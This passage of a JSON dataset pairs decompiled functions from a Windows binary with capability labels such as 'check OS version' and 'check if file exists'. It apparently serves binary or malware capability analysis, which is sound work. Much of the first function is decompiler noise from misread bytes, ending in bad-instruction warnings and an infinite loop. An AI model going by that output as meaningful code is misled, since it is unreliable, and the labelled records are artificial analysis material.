= *pcVar15;\n                            pcVar15 = pcVar15 + *(iVar23 + 0x37);\n                            uVar7 = puVar36 >> 8;\n                            *puVar36 = *puVar36 & uVar7;\n                            uVar6 = 9 < (pcVar15 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((pcVar15 >> 8) - uVar6, pcVar15 + uVar6 * -6) & 0xff0f;\n                            uVar132 = *(pcVar15 & 0xffff0000 | uVar11);\n                            uVar9 = uVar10 ^ *(uVar17 + 0x4f);\n                            uVar122 = ppcVar119 & 0xffff0000 | CONCAT11(uVar34 - cVar49, uVar10) & 0xffffff00;\n                            pcVar45 = uVar122 | uVar9;\n                            *(uVar109 - 8) = iVar115 + 1;\n                            *(uVar109 - 0xc) = pcVar45;\n                            uVar17 = uVar17 ^ *(puVar19 + 0x43);\n                            *(uVar109 - 0x12) = puVar36;\n                            puVar16 = (pcVar15 & 0xffff0000 | uVar11 & 0xffffff00 | uVar11 & uVar132) + iVar37 + 0x50;\n                            uVar132 = *puVar16;\n                            uVar8 = uVar17 >> 8;\n                            *puVar16 = *puVar16 + uVar8;\n                            cVar49 = uVar7 + *0x282d2230;\n                            uVar27 = iVar37 + 4U & *puVar19;\n                            *(uVar109 - 0x12) = puVar19;\n                            *pcVar45 = *pcVar45 + uVar17;\n                            *(uVar109 - 0x16) =\n                                 (puVar36 & 0xffff0000 | CONCAT11(cVar49 + CARRY1(uVar132, uVar8), puVar36)) ^\n                                 *(uVar27 + 0x39);\n                            iVar23 = *(uVar109 - 0x16);\n                            uVar17 = uVar17 + 1;\n                            *(uVar109 - 0x16) = iVar23;\n                            uVar38 = iVar23 - 1;\n                            puVar19[0x15] = puVar19[0x15] ^ uVar17;\n                            uVar132 = uVar38 ^ *(puVar19 + 0x49);\n                            pcVar18 = *(uVar109 - 0x18);\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar38 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            puVar36 = uVar38 & 0xffff0000 | uVar11;\n                            puVar16 = iVar115 + 0x2d;\n                            uVar132 = *puVar16;\n                            uVar7 = uVar17 >> 8;\n                            *puVar16 = *puVar16 + uVar7;\n                            *pcVar45 = (*pcVar45 - (pcVar18 >> 8)) - CARRY1(uVar132, uVar7);\n                            uVar9 = uVar9 + pcVar18[iVar115 + 0x3f];\n                            uVar122 = uVar122 | uVar9;\n                            *pcVar18 = *pcVar18 + uVar7;\n                            pcVar15 = iVar115 + 1;\n                            uVar39 = *(uVar109 + 0x46 + puVar36 * 2);\n                            *(uVar109 - 0x18) = pcVar15;\n                            uVar132 = *puVar36;\n                            *pcVar15 = *pcVar15 + (uVar17 ^ uVar39 ^ *(puVar19 + 0x15));\n                            pcVar48 = puVar19 + 2U ^ *0x303d1635;\n                            *(uVar109 - 0x1c) = uVar38 & 0xffff0000 | uVar11 & 0xffffff00 | (uVar11 ^ uVar132) + 0xbe;\n                            uVar38 = *(uVar109 - 0x1c);\n                            *(uVar109 - 0x1c) = uVar38;\n                            puVar19 = *(uVar109 - 0x1c);\n                            *(uVar109 - 0x1c) = uVar109 - 0x18;\n                            puVar110 = uVar109 - 0x20;\n                            *(uVar109 - 0x20) = puVar19;\n                            *(uVar27 + 0x30) = *(uVar27 + 0x30) ^ pcVar18 + 1U;\n                            *(uVar109 - 0x24) = uVar27;\n                            *0x56203f5d = *0x56203f5d + puVar19;\n                            *puVar19 = *puVar19 & uVar122;\n                            pcVar45 = *(uVar109 - 0x24);\n                            uVar17 = uVar38 ^ 0x52000054;\n                            *(uVar17 + 0x42) = *(uVar17 + 0x42) ^ puVar19;\n                            uVar6 = 9 < (uVar17 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar38 >> 8) + uVar6, uVar17 + uVar6 * '\\x06') & 0xff0f;\n                            iVar37 = uVar27 - 1;\n                            uVar132 = uVar11;\n                            uVar6 = 9 < uVar132 | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            puVar26 = uVar17 & 0xffff0000 | uVar11;\n                            pcVar15 = pcVar48 + -1;\n                            *puVar26 = *puVar26 ^ puVar26;\n                            *pcVar15 = *pcVar15 + uVar9;\n                            iVar23 = uVar122 - *(pcVar45 + 0x20);\n                            bVar131 = uVar11 < 0x34;\n                            uVar132 = uVar11 - 0x34;\n                            puVar114 = uVar17 & 0xffff0000 | uVar11 & 0xffffff00 | uVar132;\n                            if (uVar132 == 0) {\n                                *puVar114 = *puVar114;\n                                *(puVar19 + 0x4d) = *(puVar19 + 0x4d) ^ *(uVar109 - 0x20);\n                                pcVar15 = *(uVar109 - 0x1c);\n                                iVar37 = uVar27 - 2;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                pcVar45 = *(uVar109 - 0x18);\n                                *puVar19 = *puVar19 ^ pcVar48;\n                                iVar23 = iVar23 + -1;\n                                *pcVar45 = *pcVar45 - (iVar23 >> 8);\n                                puVar26 = *(uVar109 - 0x14);\n                                *puVar26 = *puVar26 | puVar26;\n                                *puVar26 = *puVar26 + puVar26;\n                                uVar132 = *(puVar19 + 0x4e);\n                                puVar110 = uVar109 - 0x14;\n                                *(uVar109 - 0x14) = pcVar48;\n                                pcVar15 = (puVar26 & 0xffffff00 | puVar26 ^ uVar132) - 1;\n                                uVar132 = pcVar15;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                bVar131 = 0xa6 < uVar132;\n                                puVar114 = uVar132 + 0x59;\n                                pcVar15 = pcVar48;\n                            }\n                            uVar122 = iVar23 + 1;\n                            if (bVar131 || uVar122 == 0) {\n                                uVar6 = 9 < (puVar114 & 0xf) | uVar6;\n                                puVar114 = puVar114 + uVar6 * -6 & 0xf;\n                            }\n                            puVar36 = pcVar45 + 1;\n                            pcVar15[0x4b] = pcVar15[0x4b] + (puVar114 & 0x24);\n                            *(puVar110 + -4) = puVar19;\n                            pcVar48 = (puVar114 & 0x24) - 1;\n                            piVar41 = pcVar18 ^ *(iVar23 + 0x35);\n                            puVar16 = puVar19 + -2;\n                            *(puVar110 + -8) = puVar36;\n                            uVar132 = pcVar48;\n                            *pcVar48 = *pcVar48 + uVar132;\n                            *pcVar48 = *pcVar48 + uVar132;\n                            uVar38 = CONCAT11(uVar122 >> 8 | *puVar16, uVar122);\n                            iVar23 = *piVar41;\n                            uVar122 = uVar122 & 0xffff0000 | uVar38 & 0xffffff00 |\n                                      uVar122 + *((uVar122 & 0xffff0000 | uVar38) + 0x20);\n                            *pcVar48 = *pcVar48 + uVar132;\n                            pcVar18 = uVar122 + 0x45 + puVar16 * 2;\n                            *pcVar18 = *pcVar18 + piVar41;\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((pcVar48 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            pcVar18 = pcVar48 & 0xffff0000 | uVar11;\n                            puVar46 = pcVar15 + -1;\n                            *pcVar18 = *pcVar18 + uVar11;\n                            *puVar46 = *puVar46 + puVar16;\n                            *puVar36 = *puVar36 & uVar11 >> 8;\n                            *(puVar110 + -0xc) = puVar46;\n                            uVar128 = *(puVar110 + -0xc);\n                            *(puVar110 + -0xc) = pcVar18;\n                            piVar123 = (pcVar18 ^ 0x3f3e250c | 0x51000000) - 1;\n                            *(puVar110 + -0x11) = (puVar16 ^ *(piVar41 + 0x35)) - 1;\n                            uVar38 = *(puVar110 + -0x11);\n                            *piVar123 = *piVar123 + piVar123;\n                            cVar49 = uVar38 >> 8;\n                            *(piVar41 + 0x39) = *(piVar41 + 0x39) + cVar49;\n                            *(puVar110 + -0x12) = pcVar45 + 2;\n                            *piVar123 = *piVar123 ^ piVar41 + 1;\n                            *puVar46 = *puVar46 ^ piVar123 >> 8;\n                            *(puVar110 + -0x16) = piVar123;\n                            iVar115 = *piVar123;\n                            *puVar46 = *puVar46 + cVar49;\n                            *(puVar110 + -0x1a) = piVar41 + 1;\n                            puVar19 = pcVar45 + 2;\n                            piVar41 = *(puVar110 + -0x15);\n                            puVar26 = uVar122 - 1;\n                            pcVar18 = piVar123 + iVar115 ^ 0xb000042;\n                            iVar23 = (iVar37 - iVar23) + -3;\n                            ppcVar111 = puVar110 + -0x15;\n                            *(puVar110 + -0x15) = puVar110 + -0x11;\n                            *puVar19 = *puVar19 & puVar46;\n                            uVar122 = uVar38;\n                            if (*puVar19 != 0) {\n                                *piVar41 = *piVar41 + iVar23 + (pcVar18 < 0x5d);\n                                *puVar26 = *puVar26 + (piVar123 + iVar115 >> 8);\n                                uVar17 = *(pcVar18 + 0x58);\n                                uVar27 = *puVar26;\n                                *(puVar110 + -0x19) = iVar23;\n                                *(puVar110 + -0x1d) = puVar46;\n                                puVar28 = pcVar18 + (-1 - uVar27);\n                                *(puVar110 + -0x21) = puVar46;\n                                uVar122 = uVar38 - 2;\n                                *(puVar110 + -0x25) = puVar19 ^ uVar17;\n                                *puVar28 = *puVar28 ^ puVar28;\n                                piVar123 = *(puVar110 + -0x25);\n                                *(uVar38 - 3) = *(uVar38 - 3) - piVar123;\n                                puVar19 = piVar123 - *piVar123;\n                                *puVar26 = *puVar26 ^ uVar122;\n                                *puVar28 = *puVar28 + puVar28;\n                                *puVar28 = *puVar28 + puVar28;\n                                puVar26 = puVar26 & 0xffffff00 | puVar26 ^ *(uVar38 + 0x44);\n                                pcVar18[0x45 - uVar27] = pcVar18[0x45 - uVar27] ^ piVar41;\n                                pcVar18 = pcVar18 + (-2 - uVar27);\n                                ppcVar111 = puVar110 + -0x25;\n                                *(puVar110 + -0x25) = uVar122;\n                                *pcVar18 = *pcVar18 + pcVar18;\n                            }\n                            *pcVar18 = *pcVar18 + pcVar18;\n                            *puVar26 = *puVar26 | ppcVar111;\n                            *(ppcVar111 + -1) = uVar128;\n                            *(ppcVar111 + -7) = uVar122;\n                            uVar7 = pcVar18 + 0x34392b21 + (0xcbc6d4de < pcVar18);\n                            uVar38 = pcVar18 + 0x34392b21 & 0xffffff00;\n                            *(uVar38 | uVar7) = *(uVar38 | uVar7) + uVar7;\n                            uVar132 = *(piVar41 + 0x53);\n                            *(ppcVar111 + -0xb) = piVar41;\n                            *(ppcVar111 + -0xf) = pcVar15 + -2;\n                            pcVar15 = (uVar38 | uVar7 ^ uVar132) ^ 0x37;\n                            *(ppcVar111 + -0x13) = iVar23;\n                            uVar7 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            pcVar15 = pcVar15 * 3 + 0x20;\n                            *pcVar15 = *pcVar15 + uVar122;\n                            uVar8 = puVar26 >> 8 & *(puVar19 + 1);\n                            uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                            uVar7 = uVar7 + uVar6 * '\\x06';\n                            uVar132 = 0x90 < (uVar7 & 0xf0) | uVar6 * (0xf9 < uVar7);\n                            uVar7 = uVar7 + uVar132 * '`';\n                            uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                            uVar7 = uVar7 + uVar6 * '\\x06';\n                            uVar7 = uVar7 + (0x90 < (uVar7 & 0xf0) | uVar132 | uVar6 * (0xf9 < uVar7)) * '`';\n                            pcVar15 = uVar38 | uVar7;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            *pcVar15 = *pcVar15 + uVar8;\n                            uVar38 = *(pcVar15 + uVar122 * 2 + 0x52);\n                            *pcVar15 = *pcVar15 + uVar7;\n                            pcVar15 = (puVar26 & 0xffff0000 | CONCAT11(uVar8, puVar26)) + 0x50;\n                            *pcVar15 = *pcVar15 + ((uVar122 ^ uVar38) + 1 >> 8);\n                            *(ppcVar111 + -0x17) = ppcVar111 + -0x13;\n                            iVar115 = *(ppcVar111 + -0x17);\n                            pcVar45 = *(ppcVar111 + -0x13);\n                            iVar37 = *(ppcVar111 + -0xf);\n                            iVar23 = *(ppcVar111 + -7);\n                            puVar26 = *(ppcVar111 + -3);\n                            puVar16 = *(ppcVar111 + 1);\n                            pcVar45[0x57] = pcVar45[0x57] ^ puVar16;\n                            uVar122 = *(ppcVar111 + 9);\n                            *(pcVar45 + 0x30) = *(pcVar45 + 0x30) ^ puVar26;\n                            *puVar26 = *puVar26 ^ pcVar45;\n                            ppcVar112 = ppcVar111 + 3;\n                            uVar6 = 9 < (uVar122 & 0xf) | 9 < (uVar7 + 1 & 4) | uVar6;\n                            uVar38 = (uVar122 & 0xffff0000 |\n                                     CONCAT11((uVar122 >> 8) + uVar6, uVar122 + uVar6 * '\\x06') & 0xff0f) - 1;\n                            pcVar15 = iVar23 + -2;\n                            *pcVar15 = *pcVar15 + puVar26 + -1;\n                            cVar49 = uVar38;\n                            uVar122 = CONCAT11(uVar38 >> 8 ^ *puVar16, cVar49);\n                            pcVar15 = uVar38 & 0xffff0000 | uVar122;\n                            *0x5150002e = *0x5150002e - (ppcVar111 + 3);\n                            puVar26[0xe] = puVar26[0xe] ^ puVar26 + -1;\n                            puVar16 = puVar16 + -1;\n                            *(iVar115 + 0x34) = *(iVar115 + 0x34) + (uVar122 >> 8);\n                            *(ppcVar111 + 3 + puVar16) = *(ppcVar111 + 3 + puVar16) - (iVar115 + 1);\n                            uVar122 = (iVar23 + -3) - *(pcVar45 + 0x57);\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            pcVar15 = pcVar15 ^ 0x4a584856;\n                            uVar132 = *puVar26;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            pcVar18 = puVar26 & 0xffff0000 | CONCAT11(puVar26 >> 8 ^ uVar132, puVar26) |\n                                      *(uVar122 + 0x25);\n                            if (pcVar18 < 1) {\n                                *(iVar37 + 0x1a) = *(iVar37 + 0x1a) & pcVar18;\n                                ppcVar111[2] = puVar16;\n                                uVar132 = puVar16;\n                                *(iVar115 + 0x45) = *(iVar115 + 0x45) ^ uVar132;\n                                uVar38 = pcVar15 + -0x4c002a4e ^ 0x4f;\n                                pcVar48 = uVar122 + iVar37 + -3;\n                                *pcVar48 = *pcVar48 + uVar38;\n                                ppcVar111[1] = uVar122;\n                                uVar38 = uVar38 & 0x41;\n                                puVar26 = pcVar15 + -0x4c002a4e & 0xffffff00 | uVar38;\n                                *puVar26 = *puVar26 ^ puVar16;\n                                uVar27 = puVar16 & 0xffff0000 |\n                                         CONCAT11((puVar16 >> 8) - *pcVar45, uVar132) & 0xffffff00 | uVar132 - *pcVar18;\n                                *(iVar115 + 0x5a) = *(iVar115 + 0x5a) + uVar38;\n                                uVar17 = puVar26 ^ 0x42434e54;\n                                *(uVar17 + 0x52) = *(uVar17 + 0x52) + (pcVar18 >> 8);\n                                uVar132 = uVar17;\n                                uVar38 = CONCAT11(uVar17 >> 8 & *0x3b230726, uVar132);\n                                pcVar15 = uVar17 & 0xffff0000 | uVar38;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                uVar11 = CONCAT11((uVar38 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                                uVar132 = uVar11;\n                                uVar6 = 9 < uVar132 | uVar6;\n                                uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                                puVar36 = uVar17 & 0xffff0000 | uVar11;\n                                puVar16 = uVar27 - 1;\n                                *ppcVar111 = pcVar18;\n                                uVar122 = uVar122 - 2;\n                                *(ppcVar111 + -3) = pcVar45;\n                                *(ppcVar111 + -7) = iVar37 + -2;\n                                piVar123 = pcVar45 + 1;\n                                uVar39 = *(ppcVar111 + -7);\n                                ppcVar112 = ppcVar111 + -7;\n                                *(ppcVar111 + -7) = piVar123;\n                                uVar132 = *puVar36;\n                                uVar6 = uVar11;\n                                *puVar36 = *puVar36 + uVar6;\n                                *piVar123 = (*piVar123 - (ppcVar111 + -7)) - CARRY1(uVar132, uVar6);\n                                *puVar16 = *puVar16 - uVar39;\n                                pcVar15 = uVar27 + 0x42;\n                                *pcVar15 = *pcVar15 + uVar39;\n                            }\n                            pcVar15 = *ppcVar112;\n                            *ppcVar112 = pcVar15;\n                            ppcVar112[-1] = uVar122;\n                            *(puVar16 + -1) = *(puVar16 + -1) ^ uVar122;\n                            *pcVar15 = *pcVar15 + pcVar15;\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\n                        *unaff_EDI = *unaff_EDI << 1;\n                        if (*unaff_EDI == '\\0') goto code_r0x0044160a;\n                        puVar16 = unaff_EDI + 0x77;\n                        uVar132 = false;\n                        *puVar16 = *puVar16 & ppuVar43 >> 8;\n                        bVar131 = *puVar16 == 0;\n                        fVar137 = in_ST2;\n                        fVar135 = in_ST2;\n                        in_ST2 = in_ST3;\n                        in_ST3 = in_ST4;\n                        in_ST4 = in_ST5;\n                        in_ST5 = in_ST6;\n                        in_ST6 = fVar142;\n                        ppuVar24 = ppuStack156;\n                        if (!bVar131) {\ncode_r0x00441599:\n                            *(ppuVar117 + 0x76) = in_FPUControlWord;\n                            *(ppuVar117 + 0x7a) = in_FPUStatusWord;\n                            *(ppuVar117 + 0x7e) = in_FPUTagWord;\n                            *(ppuVar117 + 0x8a) = in_FPUDataPointer;\n                            *(ppuVar117 + 0x82) = in_FPUInstructionPointer;\n                            *(ppuVar117 + 0x22) = in_FPULastInstructionOpcode;\n                            *(ppuVar117 + 0x92) = fVar136;\n                            *(ppuVar117 + 0x27) = fVar135;\n                            *(ppuVar117 + 0xa6) = in_ST2;\n                            *(ppuVar117 + 0x2c) = in_ST3;\n                            *(ppuVar117 + 0xba) = in_ST4;\n                            *(ppuVar117 + 0x31) = in_ST5;\n                            *(ppuVar117 + 0xce) = fVar142;\n                            *(ppuVar117 + 0x36) = CONCAT28(in_MM7_Wd, CONCAT26(in_MM7_Wc, CONCAT24(in_MM7_Wb, in_ST7)));\n                            cVar49 = ppuVar12;\n                            *ppuVar12 = *ppuVar12 + cVar49;\n                            *ppuVar12 = *ppuVar12 + cVar49;\n                            *ppuVar12 = *ppuVar12 + cVar49;\n                            *ppuVar12 = *ppuVar12 + cVar49;\n                            do {\n    // WARNING: Do nothing block with infinite loop\n                            } while( true );\n                        }\n                    }\n                    ppuStack92 = ppuVar116;\n                    puVar16 = ppuVar117[-0x18];\n                    ppuVar116 = ppuVar117;\n                    in_ST6 = CONCAT64(CONCAT55(CONCAT41(CONCAT37(CONCAT21(CONCAT19(puVar16 >> 0x18, \n                                                                                   CONCAT18(uVar141 >> 0x28, uVar141))\n                                                                          >> 0x40, puVar16 >> 0x10), \n                                                                 (uVar141 >> 0x20) << 0x30) >> 0x30, puVar16 >> 8), \n                                               (uVar141 >> 0x18) << 0x20) >> 0x20, uVar141 & 0xffffff | puVar16 << 0x18)\n                    ;\n                    ppuVar44 = ppuStack76;\n                }\n                puVar16 = ppuVar25 + 0x5c40765f;\n                uVar132 = CARRY1(*puVar16, uVar7);\n                *puVar16 = *puVar16 + uVar7;\n                bVar131 = *puVar16 == 0;\n                fVar135 = in_ST0;\n            }\n            in_ST5 = fVar138;\n            in_ST4 = fVar142;\n            in_ST3 = fVar135;\n            in_ST2 = fVar137;\n            uStack52 = uVar144 >> 0x20;\n            appuStack228[1] = &stack0xffffff34;\n            uVar132 = 0xfa3f899f < ppuVar12;\n            ppuVar24 = ppuVar12 + 0x1701d98;\n            uVar143 = CONCAT44(param_2, ppuVar24);\n            bVar131 = ppuVar24 == NULL;\n            ppuStack232 = ppuVar117;\n            appuStack228[0] = ppuVar113;\n            appuStack228[2] = ppuVar43;\n            appuStack228[3] = param_2;\n            ppuStack212 = ppuVar25;\n            ppuStack208 = ppuVar24;\n            ppuVar116 = ppuStack92;\n            if (!uVar132 && !bVar131) goto code_r0x004414c5;\n            ppuVar116 = ppuVar117 + -1;\n            ppuVar12 = ppuVar25;\n            ppuStack268 = unaff_ESI;\n            ppuStack264 = ppuVar116;\n            appuStack260[0] = ppuVar113;\n            appuStack260[1] = &stack0xfffffff4;\n            appuStack260[2] = ppuVar43;\n            appuStack260[3] = param_2;\n            appuStack244[0] = ppuVar25;\n            appuStack244[1] = ppuVar24;\n            appuStack228[1] = &stack0xffffff34;\n            unaff_EBX = unaff_ESI;\n            if (uVar132 || ppuVar116 == NULL) goto code_r0x00441469;\n            uVar132 = false;\n            ppuVar12 = ppuVar24 ^ 0x31407660;\n            uVar143 = CONCAT44(param_2, ppuVar24) ^ 0x31407660;\n            bVar131 = ppuVar12 == NULL;\n            ppuVar44 = ppuVar43;\n            ppuVar117 = ppuVar113;\n            ppuStack44 = ppuVar116;\n            unaff_EDI = unaff_ESI;\n            appuStack296[0] = ppuVar116;\n            appuStack296[1] = ppuVar113;\n            appuStack296[2] = &stack0xfffffef4;\n            puVar114 = &stack0xfffffef4;\n            appuStack296[3] = ppuVar43;\n            ppuStack280 = param_2;\n            ppuStack276 = ppuVar25;\n            ppuStack272 = ppuVar12;\n            appuStack260[1] = &stack0xfffffff4;\n            puVar126 = &stack0xfffffff4;\n            appuStack228[1] = &stack0xffffff34;\n            ppuVar24 = &stack0xffffff34;\n        } while (bVar131);\n    }\ncode_r0x004413f9:\n    uVar132 = ppuVar25;\n    *ppuVar25 = *ppuVar25 + uVar132;\n    *ppuVar25 = *ppuVar25 + uVar132;\n    *ppuVar25 = *ppuVar25 + uVar132;\n    uVar6 = ppuVar25 >> 8;\n    bVar131 = CARRY1(uVar132, uVar6);\n    ppuVar12 = ppuVar25 & 0xffffff00 | uVar132 + uVar6;\n    unaff_EDI = CONCAT13(uStack141, CONCAT12(uStack142, uStack144));\n    ppuVar24 = ppuVar13;\n    goto code_r0x00441402;\n}\n",
        "token_count": 97817
    },
    "004066a0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066a0(int32_t *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_10h != NULL) {\n        *arg_10h = arg_8h[0xf];\n    }\n    if ((*arg_8h == 4) || (*arg_8h == 5)) {\n        (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[3]);\n    }\n    if (*arg_8h == 6) {\n        (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[1]);\n    }\n    arg_8h[0xd] = arg_8h[10];\n    arg_8h[0xc] = arg_8h[10];\n    *arg_8h = 0;\n    arg_8h[7] = 0;\n    arg_8h[8] = 0;\n    if (arg_8h[0xe] != NULL) {\n        iVar1 = (*arg_8h[0xe])(0, 0, 0);\n        arg_8h[0xf] = iVar1;\n        *(arg_ch + 0x30) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "004067e0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004067e0(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if ((*arg_8h == 4) || (*arg_8h == 5)) {\n        (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[3]);\n    }\n    if (*arg_8h == 6) {\n        (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[1]);\n    }\n    arg_8h[0xd] = arg_8h[10];\n    arg_8h[0xc] = arg_8h[10];\n    *arg_8h = 0;\n    arg_8h[7] = 0;\n    arg_8h[8] = 0;\n    if (arg_8h[0xe] != NULL) {\n        iVar1 = (*arg_8h[0xe])(0, 0, 0);\n        arg_8h[0xf] = iVar1;\n        *(arg_ch + 0x30) = iVar1;\n    }\n    (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[10]);\n    (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[9]);\n    (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h);\n    return 0;\n}\n",
        "token_count": 345
    },
    "00414a20": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00414a20(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch, uint noname_6, \n            uint arg_24h, int32_t arg_28h, uint arg_2ch, int32_t arg_30h, uint arg_34h, int32_t arg_38h, uint noname_13\n            , uint noname_14, uint arg_44h, uint arg_48h)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_10h_00;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint uStackY11836;\n    int32_t iStackY11832;\n    int32_t iStackY11828;\n    int32_t iStackY11820;\n    uchar auStackY11816 [20];\n    uint32_t uStackY11796;\n    uint var_1a80h;\n    uint var_12b0h;\n    uint var_ec8h;\n    uint var_ae0h;\n    uint var_6f8h;\n    uint var_5f8h;\n    uint var_404h;\n    uint var_204h;\n    uint uStackY332;\n    int32_t iStackY328;\n    uint uStackY324;\n    uint *puStackY320;\n    uchar *puStackY316;\n    uint uStackY312;\n    int32_t iStackY308;\n    uint *puStackY304;\n    int32_t iStackY300;\n    uint *puVar4;\n    uint arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e343;\n    var_ch = *in_FS_OFFSET;\n    fcn.0042bc40();\n    *in_FS_OFFSET = &fcn.00414a20::var_ch;\n    iStackY11828 = arg_28h;\n    iStackY11820 = arg_30h;\n    iStackY11832 = arg_38h;\n    var_4h = 0;\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    fcn.0042a6e0();\n    (**0x463094)();\n    arg_10h = (**0x46301c)();\n    fcn.0042a6e0();\n    iVar1 = (**0x462f74)();\n    (**0x462e68)();\n    arg_8h_00 = 0x44705c;\n    uStackY11836 = 0x100;\n    iVar2 = (**0x463068)();\n    if (iVar1 != 0) {\n        fcn.00420910(0x10);\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        (**0x463038)();\n        if (iVar2 == 0) {\n            iStackY11828 = (**0x463090)();\n        }\n        else {\n            iStackY11828 = (**0x463090)();\n        }\n        if ((iStackY11828 != 0) && (iVar1 = (**0x4630d4)(),  iVar1 != 0)) {\n            fcn.0042a6e0();\n            (**0x463038)();\n            fcn.0040beb0(&stack0xffffd1d8);\n            var_4h._0_1_ = 1;\n            (**0x463038)();\n            var_4h = var_4h._1_3_ << 8;\n            if (0xf < uStackY11796) {\n                fcn.0042a679();\n            }\n            (**0x462f30)();\n            (**0x462ea4)();\n            fcn.0042a6e0();\n            (**0x463038)();\n            (**0x463038)();\n            (**0x462f30)();\n            (**0x462ea4)();\n            fcn.0042a6e0();\n            (**0x463038)();\n            (**0x463038)();\n            (**0x462f30)();\n            (**0x462ea4)();\n            (**0x463038)();\n            (**0x463038)();\n            (**0x463038)();\n            (**0x463038)();\n            (**0x463038)();\n            (**0x463038)();\n            (**0x462f30)();\n            (**0x462f30)();\n            (**0x463094)();\n            iStackY11820 = (**0x46301c)();\n            arg_10h_00 = (**0x462f30)();\n            fcn.0042a840(iStackY11820, &fcn.00414a20::var_404h, arg_10h_00);\n            puVar4 = &fcn.00414a20::var_404h;\n            iVar2 = (**0x462f30)();\n            fcn.0042a840(iVar2 + iStackY11820, puVar4, arg_34h);\n            (**0x462f30)();\n            puVar4 = &fcn.00414a20::var_404h;\n            iVar2 = (**0x462f30)();\n            iStackY300 = 0x414f73;\n            fcn.0042a840(iVar2 + iStackY11832 + iStackY11820, puVar4, arg_10h);\n            iVar2 = 0;\n            do {\n                iStackY300 = 0x414f8d;\n                iStackY300 = (**0x462f30)();\n                puStackY304 = &fcn.00414a20::var_204h;\n                uStackY312 = 0x414f9c;\n                iStackY308 = iVar1;\n                (**0x463054)();\n                uStackY312 = 0;\n                puStackY316 = &stack0xffffd1c4;\n                puStackY320 = &fcn.00414a20::var_6f8h;\n                uStackY324 = 0x13;\n                uStackY332 = 0x414fb5;\n                iStackY328 = iVar1;\n                iVar3 = (**0x4630ec)();\n                if ((iVar3 != 0) && (iVar3 = (**0x463068)(),  iVar3 == 0)) break;\n                (**0x462ea8)();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < 6);\n            iStackY300 = 0x414ff0;\n            fcn.0042a6e0();\n            puStackY304 = 0x41500d;\n            iStackY300 = iVar1;\n            iVar1 = (**0x462f98)();\n            while ((iVar1 != 0 && (iStackY11832 != 0))) {\n                *(&fcn.00414a20::var_1a80h + iStackY11832) = 0;\n                (**0x463038)();\n                iVar1 = (**0x462f98)();\n            }\n        }\n    }\n    (**0x462f70)();\n    (**0x462f70)();\n    (**0x462f70)();\n    if (0xf < arg_1ch) {\n        fcn.0042a679();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1766
    },
    "00405b50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
